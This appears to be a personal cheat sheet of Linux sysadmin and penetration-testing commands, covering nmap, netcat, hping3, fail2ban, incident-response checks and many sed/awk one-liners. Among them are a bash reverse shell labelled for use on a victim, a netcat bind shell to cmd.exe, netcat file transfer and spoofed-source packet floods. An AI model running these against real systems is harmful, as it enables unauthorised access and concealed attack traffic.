# Not really a bash_history, but a scratchpad to keep commands that I pickup or use
# and want to keep handy. Some sysadmin stuff, some pentesty stuff. 

apt-get upgrade | tee upgrade-$( date +%F ).log # Runs an upgrade and outputs to stdout as well as to a logfile
openssl s_client -connect customer.website.com:443 # Connect to a website over SSL like HTTP
sudo service ntpd stop
sudo service mysql start
sudo service mysql status
sudo service apache2 status
sudo vi /etc/ssh/sshd_config
sudo passwd -dl root
sudo apt-get update
sudo apt-get clean
sudo apt-get install lamp-server^
netstat -an
iotop
top


# fail2ban config
sudo apt-get install fail2ban                    # Initial install
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local       # one time to copy and make non-default edits
sudo nano /etc/fail2ban/jail.local   # edit the local configs to make your own
sudo service fail2ban restart     # restart fail2ban to implement the new configs
sudo fail2ban-client status     # get info about the current configuration of fail2ban
sudo iptables -S  # see the current blocklist
sudo fail2ban-client status apache   # Show the configuration for the "apache" filters
sudo fail2ban-client set apache unbanip 111.111.111.111 # Remove an IP from the banned IP list

# NTP
cat /etc/default/ntp
sudo vi /etc/default/ntp
sudo service ntp restart

# nmap
nmap -sT 10.10.10.10  # Standard TCP Connect Scan. Best if you want to stay "standard" traffic. 
nmap -sS 10.10.10.10  # SYN only packets. Stealthier in an environment with no IDS, louder in an environment with it. 
nmap -sS -A 10.10.10.10  # Very noisy scan, gets OS and Services
nmap -sF 10.10.10.10  # FIN Scan
nmap -sA 10.10.10.10  # ACK scan
nmap -sN 10.10.10.10  # NULL scan
nmap -sX 10.10.10.10  # XMAS scan
nmap -sU 10.10.10.10  # UDP scan
nmap -P0 10.10.10.10  # Do not Ping before scanning
nmap -PA80,21,23,25 10.10.10.10  # List ports to scan, includes ACK
nmap -PS80,21,23,25 10.10.10.10  # List ports to scan, SYN only
nmap -PU161,53 10.10.10.10  # Lists ports to scan, UDP
nmap -PE 10.10.10.10  # Use ICMP Echo for mapping
nmap -PP 10.10.10.10  # Use ICMP Echo for mapping
nmap -PM 10.10.10.10  # Use ICMP Netmask request for mapping
nmap -PB 10.10.10.10  # Use default ICMP. Both TCP ack and ICMP Echo request sweeps in parallel 
cd /usr/share/nmap/scripts  # List the NMAP scripts
cat script.db | grep intrusive  # Find out which nmap scripts are considered intrusive
nmap -n -sC --script=sshv1.nse 10.10.10.0/24 -p 22  # Check for SSHv1
nmap -n -sC --script=nbtstat.nse 10.10.10.0/24  # Looks for Netbios traffic 
nmap -sV --script ssl-enum-ciphers -p 443 10.10.10.10

# NetCat
nc -l 8888  # Listen for connections on this port (Or -L on Windows), 
nc www.website.com 80  # Then do GET / HTTP/1.0 - Does banner grabbing
nc 10.10.10.10 8888  # connect to a port on a target
nc -v -w 2 -z 10.10.10.10/24 10-2000 # Basic port scanner. Verbose, short wait, zero data sent
nc -nv 10.10.10.10 8888 -e cmd.exe # (Run on Windows Box) Ties port 8888 to Command Shell

nc -lnvp 8888 > foo.txt  # Two part command, This tells receiving system to save input to foo.txt
nc -lnvp 10.10.10.10 8888 < foo.txt  # Second part, reads foo.txt and sends it to the other system


# HPing examples. More here: http://www.rationallyparanoid.com/articles/hping.html
hping3 example.com -S -A -F -V -p 443  # SYN, ACK, FIN, port 443
hping3 example.com -S -V -p 443 -i 5   # Ping 443 every 5 seconds with a SYN packet
hping3 example.com -S -p 443 -i u100000  # Ping every .1 seconds, verbose removed
hping3 example.com -S -p 443 -i u10000 -c 500  # Ping every .01 seconds, stop after 500 packets, verbose removed
hping3 example.com --udp --spoof 192.168.1.150  # Send UDP packets spoofed to be from source 192.168.1.150
hping3 example.com --udp --rand-source  # Send UDP packets spoofed to be from various random source IP addresses
hping3 example.com -V --udp --data 100 # Send UDP packets with the data portion padded with 100 bytes to host example.com
hping3 --baseport 53 --destport 80 --syn 10.10.10.10  # Sent SYN packet from 53 to 80 (Subsequent pings come from subsequent 


# Nikto for web scans
nikto --host 10.10.10.10

rpcinfo -p 10.10.10.10 # enumerate listening RPC

enum  # SMB Enumeration

## Incident Response - Basic info gathering:
env
date
uptime
uname -a
vmstat
netstat -an4
netstat -an6
lsof -ni4
who
w 
ps aux
last -adi -f /var/log/wtmp
last -adi -f /var/log/btmp
# End basic IR 



# General admin and whatnot
netstat -ant
for file in $(ls -1 .); do if [ -s "$file" ]; then rm $file; fi; done
sudo apt-get install java
sudo apt-get search java
apt-get -h
sudo apt-get install metasploit
sudo apt-get install msfconsole
./quick-msf-setup 
sudo ./quick-msf-setup 
du -h --max-depth=1
source ~/.bashrc
ls -X    # Group files by extension
ls -S    # List files in descending order of size
ssh -l username -p 2222 localhost
ssh root@127.0.0.1 -p 2244
uname -a
lsb_release -a
cat /home/*/.ssh/authorized_keys 
sudo netstat -taupen
usermod -p 
lsof
ps -ano
ps -ef
watch netstat -ant
tmux attach
tmux
ssh -R 45454:10.10.10.1:23456 username@127.0.0.1 -p 2222
w
top
id
ssh-keygen -f "/home/someuser/.ssh/known_hosts" -R [127.0.0.1]:2244
sudo service apache2 stop
last
who
lastb
sudo lastb
tail /var/log/lastlog 
tail /var/log/syslog
sudo tail /var/log/syslog
python -m SimpleHTTPServer 
# Most below here are probably from https://twitter.com/climagic
sudo bash -c 'swapoff -a && swapon -a' # After killing processing using up all your RAM on Linux (Firefox!!), move processes off of swap.
sudo fdisk -l /dev/sd? # Show partitions of only physical SCSI/SATA/SCA drives and not other things like device mapper entries.
<Ctrl-r>searchpattern # Every time you reuse a command from your command history, it saves a tree in the digital world. 
echo ${USER:0:${#USER}/2} # You can use arithmetic inside bash variable expansions, such as this to get the first half of your username
touch -r oldfile newfile # set access/modification times of newfile to those of oldfile. #ididntdoit
echo ｙoυrｂａｎｋ.com | hexdump -c # Check a domain to make sure its all the ASCII characters you expect and not Unicode look-a-likes
lsof -Pan -i tcp -i udp # Show all programs listening TCP/UDP ports. You may want to run this with superuser privileges.
for i in $(seq 4 65);do echo -n "${pi:0:$i}.com: ";whois ${pi:2:$((i-2))}.com|grep --col=no "rant Na"||echo;sleep 5;done #pi domain owners
pi=$( echo "scale=1000;4*a(1)" | BC_LINE_LENGTH=1004 bc -l ) # Happy Pi Day! Calculate π to 1000 digits using bc and assign it to pi
ps ax -o state -o ppid | awk '$1=="Z"{print $2}' | xargs kill -9 # Kill all #zombies on the system.
echo "$URL" | tr -s / _ # Change URL into a more filesystem friendly form and squeeze the repeated _ chars into one. #TryingAgain
seq 20 | shuf # Generate a random ordered list of 20 numbers. For example to determine order of presentation.
find . -exec file -b --mime-type {} + | sort | uniq -c | sort -nr # Make stats of the top file types in this directory and below.
grep -io "cyber" | wc -l # How many times did they say cyber? Just select all in your browser copy and paste into this command to find out.
shopt -u huponexit # in bash, set this option to make sure backgrounded jobs don't get killed when the parent shell exits
pgrep rsync | xargs ionice -c3 -p # Adjust all rsync processes on the system so that they have lower (idle) IO priority.
grep -h "POST /.*wp-login.php" *-access_log |awk '$1!~/^my.ip.addr$/{print $1}' |sort|uniq -c|sort -nr |head -50> wp-abusers.txt # WP abuse
ps wu -U someuser # An easy way of selecting the processes owned by someuser.
(head -5; tail -5) < log # Show the first and last 5 lines of the file 'log'.
script upgrade.log # script is a nice program that allows you to record your interactive shell session. Great for logging upgrades.
less -S file.txt # The -S turns off word wrap and allows scrolling to side. Great for logfiles. 
grep -n alpha $(grep -Irl beta *)   # grep for 'alpha', but only in files that also contain 'beta':
echo "fuzzbuzz" | sed -e "s/u/i/2" # Replace the second occurrence of a regex match.
make ; mpg123 hawaii-five-o-theme.mp3 # Play a song at the end of long running command to notify you
while read line; do echo "line length is ${#line}"; done # While loops are good for reading data from stdin and running processes against it
find . -mtime +$((365*5)) -maxdepth 1 -exec du -sb {} \; |awk '{s+=$1}END{print s}' # Total bytes used by 5+ year old directories in CWD
cat access_log-*|awk '{print substr($4,5,8)}'|uniq -c|gnuplot -e "set terminal dumb;plot '-' using 1:xtic(2) with boxes" # Web request chart
man find |sed -e '/./{H;$!d;}' -e 'x;/modified/!d;i==' # In the find man page, show whole paragraphs containing the word modified 
printf "10^%d\n" {0..20} | bc | sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta' # Add separator commas to long numbers.
dmesg -wH # Live dmesg output in human readable format (colors, timing)
find . -atime -$(date +%j) -type f # Find files you haven't accessed so far this year in a directory. Requires atime attributes.
fdupes -r Pictures > dupes.txt # Find file duplicates in 'Pictures' recursively based on size and mdsum and log them to dupes.txt.
egrep -oi '#[a-f0-9]{6}' file.css | sort | uniq # extract all unique hex color codes from a CSS file
for i in {1..20} ; do rig|head -1 |tr A-Z a-z;done |while read f l;do echo ${f:0:1}${l}:$(pwgen 12 1);done # Gen 20 random users/passwords
find . -mtime +$((365*5)) -maxdepth 1 -exec du -sb {} \; |awk '{s+=$1}END{print s}' # Total bytes used by 5+ year old directories in CWD
ssh -D 9999 you@remotehost # Use -D to create a SOCKS5 tunnel inside your SSH connection. Some programs (like a web browser) can use these.
for i in *.jpg; do identify "$i"; done # Use a for loop to iterate over a list of items (files, numbers, etc) and run processes accordingly.
pgrep myscript.pl && echo still running || echo "done" | mail admin # Use the && and || logic operators for results based process control.
zless, zgrep, zcat, zdiff # There are helper commands for dealing with compressed files (gz, bz2 and xz). They have a z, bz or xz prefix.
find . -print | sort | sed 's;[^/]*/;|---;g;s;---|; |;g' # Generate output similar to 'tree' without using tree
ps auxwwf | sed -n -r -e '/^.{64} \//h;/\\/H' -e '/^.{14} [8-9][0-9]\.[0-9]/{x;p}' # Print the high CPU process's family tree.
iptables -A INPUT -m state --state NEW -m geoip --src-cc CN -j DROP  # Does geolocated/georestricted Firewalls
identify -format "%f F:%[EXIF:Flash]\n" *.jpg | egrep " F:(0|16|24|32)$" # Show photo filenames where no flash was used. Reqires Imagemagick
find / \( -path /proc -o -path /sys \) -prune -o -print # Search the file system, but don't descend into the /sys or /proc directories.
history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10 # Count and show most popular bash_history entries
/bin/bash -i > /dev/tcp/10.10.10.10/8080 0<&1 2>&1   # Reverse shell. Run this on victim IP to connect back to hacker IP
split --lines=50 foo.txt  # Split a text file into files with 50 lines each
ping -c100 4.2.2.2 | sponge | pee head tail # The pee command can run head and tail on same input. sponge waits for all the data first.

# Sed
sed -i 's/^[ \t]*//' somefile # trim leading whitespace
sed -i 's/^[ \t]*//;s/[ \t]*$//' somefile # Trim leading and trailing whitespace: 
sed ':a;N;$!ba;s/\n/<br \/>/g' # Joins multiple lines and separates them with the string "<br />".
sed -n '$p;h;n;p;g;p' # Swap each line of input with the next line of input.
sed '9417q;d' dbdump.sql # Quickly print line 9417 of a large file without processing the whole file.
sed '/Alice/!d; /Bob/!d' irc.log # Search irc.log for lines containing Alice and Bob regardless of their order in the line.
sed -i -e '/^\s*#/!s/$val\>/$pid/g' getproc.pl # Replace all variables $val with $pid in getproc.pl, except on commented lines
sed -i -e :a -e '/\\$/N; s/\\\n//; ta' script.sh # Unwrap lines that end with a backslash in script.sh
sed 's/^/\t/' config.cfg | less # Print config.cfg tab indented to fix a bad console not letting you to see first few columns.
sed -n '3,7p' somefile  # The sed command p prints. For example, print lines 3 through 7 of a file: 
sed -i '/^$/N;/\n$/N;//D' notes.txt # Compress consecutive blank lines down to just 2 in the file notes.txt


awk '{print $1}' data.txt # Print out just the first column (whitespace separated) of data.txt
awk '{print $7}' access_log | sort | uniq -c | sort -rn | head -100 # Display top 100 files accessed on website.
